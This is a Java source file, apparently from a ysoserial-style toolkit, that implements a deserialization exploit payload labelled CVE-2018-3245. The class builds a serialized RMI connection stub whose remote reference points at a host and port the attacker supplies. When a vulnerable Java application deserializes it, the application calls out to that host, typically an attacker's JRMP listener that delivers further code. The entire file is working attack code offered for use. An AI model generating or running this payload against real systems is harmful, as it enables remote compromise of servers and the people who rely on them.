package payloads;


import javax.management.remote.rmi.RMIConnectionImpl_Stub;
import payloads.annotation.Authors;
import sun.rmi.server.UnicastRef;
import sun.rmi.transport.LiveRef;
import sun.rmi.transport.tcp.TCPEndpoint;
import util.PayloadRunner;

import java.rmi.server.ObjID;
import java.util.Random;

// CVE-2018-3245
@SuppressWarnings ( {
        "restriction"
} )
@Authors({ Authors.CCKUAILONG })
public class JRMPClient6 extends PayloadRunner implements ObjectPayload<Object> {

    public Object getObject (final String command ) throws Exception {
        String host;
        int port;
        int sep = command.indexOf(':');
        if (sep < 0) {
            port = new Random().nextInt(65535);
            host = command;
        }
        else {
            host = command.substring(0, sep);
            port = Integer.parseInt(command.substring(sep + 1));
        }
        ObjID objID = new ObjID(new Random().nextInt());
        TCPEndpoint tcpEndpoint = new TCPEndpoint(host, port);
        UnicastRef unicastRef = new UnicastRef(new LiveRef(objID, tcpEndpoint, false));
        RMIConnectionImpl_Stub obj = new RMIConnectionImpl_Stub(unicastRef);
        return obj;
    }

    public static byte[] getBytes (final String command, Boolean fusion) throws Exception {
        Thread.currentThread().setContextClassLoader(JRMPClient6.class.getClassLoader());
        return PayloadRunner.run(JRMPClient6.class, command, fusion);
    }
}
